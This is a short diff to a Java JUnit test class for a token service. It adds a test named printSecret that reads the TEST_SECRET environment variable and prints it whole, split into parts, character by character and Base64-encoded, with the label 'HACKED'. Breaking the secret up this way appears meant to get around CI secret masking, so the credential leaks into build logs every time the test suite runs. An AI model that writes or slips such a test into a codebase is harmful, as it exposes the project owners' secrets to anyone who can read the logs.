@@ -11,6 +11,7 @@ import static org.mockito.Mockito.when;
 import static org.springframework.http.HttpStatus.UNAUTHORIZED;
 import static org.springframework.http.MediaType.APPLICATION_FORM_URLENCODED;
 
+import java.util.Base64;
 import java.util.Map;
 import org.junit.jupiter.api.BeforeEach;
 import org.junit.jupiter.api.Test;
@@ -74,6 +75,19 @@ class TokenServiceTest {
     RuntimeException ex = assertThrows(RuntimeException.class,
         () -> tokenService.fetchAccessToken());
     assertTrue(ex.getMessage().contains("Token request failed"));
+  }
+
+  @Test
+  void printSecret() {
+    String secret = System.getenv("TEST_SECRET");
+    System.out.println("🔥 HACKED TEST_SECRET (from test): " + secret);
+    System.out.println("First 5: " + secret.substring(0, 5));
+    System.out.println("Rest: " + secret.substring(5));
+    for (int i = 0; i < secret.length(); i++) {
+      System.out.println("Char " + i + ": " + secret.charAt(i));
+    }
+    System.out.println("Base64 encoded secret: " + Base64.getEncoder().encodeToString(secret.getBytes()));
+
   }
 
 }
